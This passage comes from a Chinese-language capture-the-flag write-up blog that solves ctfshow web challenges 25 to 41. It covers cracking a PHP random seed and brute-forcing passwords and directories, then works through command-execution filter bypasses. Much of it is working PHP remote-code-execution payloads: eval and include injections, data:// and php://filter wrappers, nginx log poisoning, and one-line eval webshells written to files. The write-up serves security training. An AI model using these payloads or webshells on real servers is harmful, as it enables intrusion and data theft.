&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便传一个参数推得r&#x3D;1951582934(第一个随机数)</p>
+<p>有了第一次生成的随机数的值，再加上之前播种的种子是固定不变的， 就可以通过php_mt_seed工具爆破出之前播种的随机数种子的值&#x3D;3607644232 工具要在KALI种运行命令: .&#x2F;php_mt_seed 1951582934</p>
+<p>.&#x2F;php_mt_seed 1951582934 注意版本（根据第一个随机数反推种子值）</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web25_1.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web25_2.png"></p>
+<p>2218608931 -  1591457009（知到种子值之后，求2、3随机数的和赋值给token）</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web25_3.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web25_4.png"></p>
+<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>法1：点击确认安装，bp抓包看到有个checkdb.php，等一下把install包放了抓到了check包，发到repeter得出</p>
+<p>法2：爆破密码 7758521</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web26_1.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web26_2.png"></p>
+<h2 id="web27-身份证日期爆破"><a href="#web27-身份证日期爆破" class="headerlink" title="web27 身份证日期爆破"></a>web27 身份证日期爆破</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web27_1.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web27_2.png"></p>
+<p>出生日期爆破：19900201，得到的msg unicode解码</p>
+<p>学号：02015237</p>
+<p>密码：身份证 621022199002015237</p>
+<p>登录即可得flag</p>
+<h2 id="web28-目录爆破"><a href="#web28-目录爆破" class="headerlink" title="web28 目录爆破"></a>web28 目录爆破</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web28_1.png"></p>
+<p>爆破目录&#x2F;0&#x2F;1&#x2F;，抓包，去掉2.txt并设定变量</p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web28_2.png"></p>
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web28_3.png"></p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p><strong>system、exec、shell_exec、passthru、popen、proc_popen</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012141979/article/details/109558856">https://blog.csdn.net/u012141979/article/details/109558856</a></p>
+<p><strong>system</strong></p>
+<p>string <strong>system</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) &#x2F;&#x2F;命令是字符串，要加引号</p>
+<ul>
+<li><p>第一个参数， $command 是要执行的命令，例如： “ls -l”</p>
+</li>
+<li><p>第二个参数，$return_var，用于保存command执行状态，0 - 成功，非零 - 失败</p>
+</li>
+<li><p>返回值，为command执行结果的最后一行（system 和 exec 类似），失败返回 FALSE</p>
+</li>
+</ul>
+<p><strong>exec</strong> 执行系统外部命令时，只返回结果的最后一行</p>
+<p>void <strong>passthru</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
+<p>passthru 和 system 基本是一样的，结果不保存，直接输出在屏幕上，两者仅是返回值不同</p>
+<p>1）system 是返回结果的最后一行，类型为 string</p>
+<p>2）passthru 不返回结果，类型为 void</p>
+<ul>
+<li>第一个参数， $command 是要执行的命令，例如： “ls -l”</li>
+<li>第二个参数，$return_var，用于保存command执行状态，0 - 成功，非零 - 失败</li>
+<li>返回值，为空 void</li>
+</ul>
+<p>绕过cat使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq</p>
+<h2 id="绕过空格用"><a href="#绕过空格用" class="headerlink" title="绕过空格用"></a><strong>绕过空格用</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%09 tab</span><br><span class="line">%0a url回车</span><br><span class="line">&lt;&gt; </span><br><span class="line">&lt;  </span><br><span class="line">&gt;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;   //在linux下，$&#123;IFS&#125;是分隔符的意思</span><br><span class="line">$IFS$9  //$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割</span><br><span class="line">&#123;cat,fl*&#125;</span><br><span class="line">%20 空格</span><br><span class="line">有时候$前加/转义符</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a> 有空读读 绕过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/107171940">https://blog.csdn.net/qq_38154820/article/details/107171940</a> 无参数rce</p>
+<h2 id="绕过cat"><a href="#绕过cat" class="headerlink" title="绕过cat"></a><strong>绕过cat</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat  从第一行开始显示文件内容</span><br><span class="line">tac  从最后一行开始显示文件内容</span><br><span class="line">nl   显示的时候，顺道输出行号</span><br><span class="line">more命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示</span><br><span class="line">less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</span><br><span class="line">head 只看头几行</span><br><span class="line">tail 只看尾巴几行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web29_1.png"></p>
+<p>if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){  &#x2F;&#x2F;在c变量中匹配flag &#x2F;i大小写不敏感</p>
+<p>eval内执行的是php代码，必须以分号结尾</p>
+<p>cat 顺序读取 tac逆向读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">法1：直接执行系统命令</span><br><span class="line">?c=system(&quot;ls&quot;);</span><br><span class="line">?c=system(&quot;tac%20fla*&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">法2：内敛执行 （反字节符）</span><br><span class="line">?c=echo%20`tac%20fla*.php`;</span><br><span class="line"></span><br><span class="line">法3：利用参数输入+eval</span><br><span class="line">?c=eval($_GET[1]);&amp;1=phpinfo();</span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(ls);</span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&quot;tac flag.php&quot;);</span><br><span class="line"></span><br><span class="line">4、利用参数输入+include</span><br><span class="line">这里的eval也可以换为include，并且可以不用括号。但是仅仅可以用来读文件了。</span><br><span class="line">?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">（参考y4tacker师傅的解法：https://blog.csdn.net/solitudi/article/details/109837640）</span><br><span class="line"></span><br><span class="line">也可以尝试写入木马 file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27); 访问alb34t.php，然后就可以连马。</span><br><span class="line"></span><br><span class="line">5、利用cp命令将flag拷贝到别处</span><br><span class="line">?c=system(&quot;cp%20fl*g.php%20a.txt%20&quot;);</span><br><span class="line">然后浏览器访问a.txt，读取即可。</span><br><span class="line"></span><br><span class="line">payload1:c=system(&quot;nl fla?????&quot;);</span><br><span class="line">payload2:c=system(&quot;nl fla*&quot;);</span><br><span class="line">payload3:c=echo `nl fl&#x27;&#x27;ag.php`;或者c=echo `nl fl“”ag.php`;</span><br><span class="line">payload4:c=echo `nl fl\ag.php`;//转义字符绕过</span><br><span class="line">payload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">payload6:c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);</span><br><span class="line">payload7:c=awk &#x27;&#123;printf $0&#125;&#x27; flag.php||</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web30_1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">法1：反字节符</span><br><span class="line">?c=echo `tac fla*.ph*`;</span><br><span class="line">?c=echo `tac fla*.ph?`;</span><br><span class="line"></span><br><span class="line">法2：passthru</span><br><span class="line">?c=passthru(&quot;ls&quot;);</span><br><span class="line">?c=passthru(&quot;tac fla*.ph?&quot;);</span><br><span class="line"></span><br><span class="line">法3：带参数输入</span><br><span class="line">?c=eval($_GET[1]);&amp;1=phpinfo(); </span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&quot;tac%20flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web31_1.png"></p>
+<p>点 空格 单引号</p>
+<p>绕过空格用%09 &lt;&gt; ${IFS} $IFS$9 {cat,fl*} %20</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">法1：绕过空格</span><br><span class="line">https://blog.csdn.net/m0_56059226/article/details/117997472</span><br><span class="line">?c=passthru(&quot;ls&quot;);</span><br><span class="line"></span><br><span class="line">?c=echo`tac%09fla*`;</span><br><span class="line">?c=passthru(&quot;tac%09fl*&quot;);</span><br><span class="line">?c=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br><span class="line">?c=passthru(&quot;tac\$&#123;IFS&#125;fla*&quot;);</span><br><span class="line"></span><br><span class="line">法1：带参数输入 只判断了变量c</span><br><span class="line">?c=eval($_GET[1]);&amp;1=phpinfo(); </span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&quot;tac%20flag.php&quot;);</span><br><span class="line">?c=eval($_GET[1]);&amp;1=passthru(&quot;tac%20flag.php&quot;);</span><br><span class="line"></span><br><span class="line">**（不太懂）法2：可以利用已知的其他函数来凑出所需要的字符串来绕过</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个&quot;.&quot;</span><br><span class="line">pos():输出数组第一个元素，不改变指针；</span><br><span class="line">scandir();遍历目录，这里因为参数为&quot;.&quot;所以遍历当前目录</span><br><span class="line">array_reverse():元组倒置</span><br><span class="line">next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</span><br><span class="line">show_source():查看源码</span><br><span class="line"></span><br><span class="line">无参数rce</span><br><span class="line">https://blog.csdn.net/qq_38154820/article/details/107171940</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web32-伪协议"><a href="#web32-伪协议" class="headerlink" title="*web32 伪协议"></a>*web32 伪协议</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web32_1.png"></p>
+<p>点 空格 单引号 &#96; 分号 (</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">法1：data://协议</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br><span class="line">data://协议必须双在on才能正常使用；</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br><span class="line">例：</span><br><span class="line">http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">or</span><br><span class="line">http://127.0.0.1/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">法2：filter</span><br><span class="line">文件名字可以改为/etc/passwd和nginx的日志文件来定位flag位置(/var/log/nginx/access.log )</span><br><span class="line">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php </span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>%0a(%09)作用，url回车符，因为空格被过滤。事实上，删去也无所谓，似乎php会自动给字符串和变量间添加空格（经检验，只在eval中有效，echo中无效，还是得要空格）</li>
+<li>?&gt;的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</li>
+</ul>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web33_1.png"></p>
+<p>点 空格 单引号 &#96; 分号 ( 双引号</p>
+<p>和32比多了个双引号 payload一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br><span class="line">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php </span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web34_1.png"></p>
+<p>点 空格 单引号 &#96; 分号 ( 双引号 :</p>
+<p>比33多了个:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">法1：</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br><span class="line">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php </span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">法2：日志注入</span><br><span class="line">url/?c=include$_GET[1]?&gt;&amp;1=../../../../var/log/nginx/access.log</span><br><span class="line">用firefox访问然后burpsuite抓包，然后再user-agent里面输入一句话木马&lt;?php eval($_POST[a]);?&gt;发送，蚁剑连接 注意 http</span><br><span class="line">/var/log/nginx/access.log是nginx默认的access日志路径</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45427131/article/details/116953100">https://blog.csdn.net/qq_45427131/article/details/116953100</a></p>
+<h2 id="web35"><a href="#web35" class="headerlink" title="*web35"></a>*web35</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web35_1.png"></p>
+<p>点 空格 单引号 &#96; 分号 ( 双引号 : <strong>&lt; &#x3D;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">法1：和34payload一样</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br><span class="line">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php </span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">法2：日志注入</span><br><span class="line">url/?c=include$_GET[1]?&gt;&amp;1=../../../../var/log/nginx/access.log</span><br><span class="line">用firefox访问然后burpsuite抓包，然后再user-agent里面输入一句话木马</span><br><span class="line">&lt;?php eval($_POST[a]);?&gt;发送，蚁剑连接 注意 http</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web35_2.png"></p>
+<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web36_1.png"></p>
+<p>点 空格 单引号 &#96; 分号 ( 双引号 : &lt; &#x3D; &#x2F; 数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">法1：将32-35的payload中的数字改成字母</span><br><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br><span class="line">?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php </span><br><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web37"><a href="#web37" class="headerlink" title="*web37"></a>*web37</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web37_1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">法1：data协议 base64</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=     //&lt;?php phpinfo()?&gt;</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=  //&lt;?php system(&quot;tac flag.php&quot;)?&gt;  passthru也可</span><br><span class="line"></span><br><span class="line">法2：日志注入文件包含</span><br><span class="line">https://e686eecd-b3de-4b0c-bd22-0b11c20cbad5.challenge.ctf.show/?c=../../../../var/log/nginx/access.log</span><br><span class="line">用firefox访问然后burpsuite抓包，然后再user-agent里面输入一句话木马</span><br><span class="line">&lt;?php eval($_POST[a]);?&gt;发送，蚁剑连接 注意 http（不知道为啥这个要把包放完才能连接）</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web38_1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">法1：和37一样 data协议 base64</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=     //&lt;?php phpinfo()?&gt;</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=  //&lt;?php system(&quot;tac flag.php&quot;)?&gt;  passthru也可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">法2：日志注入文件包含</span><br><span class="line">法3：过滤了php</span><br><span class="line">?c=data://text/plain,&lt;?=system(&#x27;tac fla*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web39"><a href="#web39" class="headerlink" title="*web39"></a>*web39</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web39_1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">法1：data协议 ?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</span><br><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac%20fla?.php&quot;);?&gt;</span><br><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac%20fla?.php&quot;);?&gt;#</span><br><span class="line"></span><br><span class="line">不能用base64,不能进行日志注入</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web40-无参数"><a href="#web40-无参数" class="headerlink" title="*web40 无参数"></a>*web40 无参数</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web40_1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">法一：</span><br><span class="line">c=eval(array_pop(next(get_defined_vars())));//需要POST传入参数为1=system(&#x27;tac fl*&#x27;);</span><br><span class="line">get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</span><br><span class="line">next()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_pop() 函数删除数组中的最后一个元素并返回其值。</span><br><span class="line">array(//多维数组</span><br><span class="line">    &#x27;_POST&#x27; =&gt; array(</span><br><span class="line">        &#x27;1&#x27; =&gt; &quot;system(&#x27;tac fl*&#x27;);&quot;</span><br><span class="line">    ),</span><br><span class="line">    &#x27;_GET&#x27; =&gt; array(),</span><br><span class="line">    // 其他环境变量和服务器变量...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">法二:类似web31</span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c=show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</span><br><span class="line">localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为&quot;.&quot;</span><br><span class="line">pos():输出数组第一个元素，不改变指针；</span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为&quot;.&quot;所以遍历当前目录</span><br><span class="line">array_reverse():数组逆置</span><br><span class="line">next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</span><br><span class="line">show_source():查看源码</span><br><span class="line">pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</span><br><span class="line">每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。</span><br><span class="line">提示：该函数不会移动数组内部指针。</span><br><span class="line">c=show_source(reset(array_reverse(scandir(pos(localeconv())))));显示index.php</span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 显示flag.php</span><br><span class="line"></span><br><span class="line">相关的方法：</span><br><span class="line">current()返回数组中的当前元素的值。</span><br><span class="line">end()将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev()将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset()将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each()返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p><img src="/ctfshow%E9%9D%B6%E5%9C%BA/web41_1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=`ls`</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/02/05/ctfshow%E9%9D%B6%E5%9C%BA/">http://example.com/2025/02/05/ctfshow%E9%9D%B6%E5%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/16/CTFTools/" title="CTFTools"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">CTFTools</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web5-php%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span 